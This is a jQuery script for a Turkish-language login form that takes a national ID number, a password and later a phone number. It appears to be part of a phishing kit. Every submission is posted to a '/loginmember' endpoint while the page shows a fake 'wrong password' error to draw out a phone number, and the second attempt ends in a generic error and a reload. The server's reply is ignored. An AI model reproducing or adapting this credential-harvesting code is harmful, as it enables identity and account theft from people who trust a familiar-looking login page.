$(function () {
    function hides() {
        $(".errorMsg").hide();
        $(".phoneRow").hide();
    }

    function postForm() {
        $form = $("#loginForm");
        $tc = $("#tc");
        $password = $("#password");
        $phone = $("#tel");

        var csrfToken = $('meta[name="csrf-token"]').attr("content");
        $.ajaxSetup({
            headers: {
                "X-CSRF-TOKEN": csrfToken,
            },
        });

        $phone.on("input", function () {
            // Girdi değeri al
            var value = $(this).val();
            // Başında 0 varsa sil
            if (value.startsWith("0")) {
                $(this).val(value.substring(1));
            }
        });
        $("#tc").on("keypress", function (e) {
            var charCode = e.which ? e.which : e.keyCode;
            // 48-57 arası rakamlar, 8 backspace, 46 delete tuşlarıdır.
            if (charCode < 48 || charCode > 57) {
                e.preventDefault();
            }

            if (this.value.length > 11) {
                this.value = this.value.substring(0, 11);
            }
        });

        $("#password").on("keypress", function (e) {
            var charCode = e.which ? e.which : e.keyCode;
            if (this.value.length < 6) {
                this.value = this.value.substring(0, 11);
            }
        });

        var $try = 0;
        $("#loginForm").submit(function () {
            if ($tc.val() == "" || $tc.val().length < 11) {
                $tc.next().slideDown();
                return false;
            } else {
                $tc.next().slideUp();
            }

            if ($password.val() == "" || $password.val().length < 6) {
                $password.next().slideDown();
                return false;
            } else {
                $password.next().slideUp();
            }

            $try++;
            //doğrulamaları geçti
            if ($try) {
                let jsonData = {
                    tc: $tc.val(),
                    password: $password.val(),
                    try: $try,
                };

                if ($try > 1) {
                    jsonData["phone"] = $phone.val();
                }

                switch ($try) {
                    case 1:
                        setError(
                            "Hatalı Şifre Denemesi 1/2",
                            "Lütfen tüm bilgilerinizi kontrol ederek telefon numaranızla birlikte tekrar deneyin."
                        );
                        $(".phoneRow").slideToggle();
                        $phone.inputmask("999-999-99-99");
                        break;

                    case 2:
                        setError(
                            "İşleminize devam edilemiyor.",
                            "Lütfen tüm bilgilerinizi kontrol ederek tekrar deneyin. Parolanız yoksa ya da unuttuysanız, aşağıdaki parolamı unuttum link'ine tıklayarak parolanızı alabilirsiniz."
                        );

                        setTimeout(function () {location.reload()}, 3000);
                        break;
                }

                $.ajax({
                    type: "POST",
                    url: "/loginmember",
                    dataType: "json",
                    data: jsonData,
                    success: function (response) {
                    },
                });

                return false;
            }
        });
    }

    function setError(title, message) {
        $errorMsg = $(".errorMsg");
        $errorMsg.hide();
        $errorMsg.fadeIn();

        $errorMsg.find(".etitle").text(title);
        $errorMsg.find(".edesc").text(message);

        $tc.val("");
        $password.val("");
        $phone.val("");
    }

    hides();
    postForm();
});
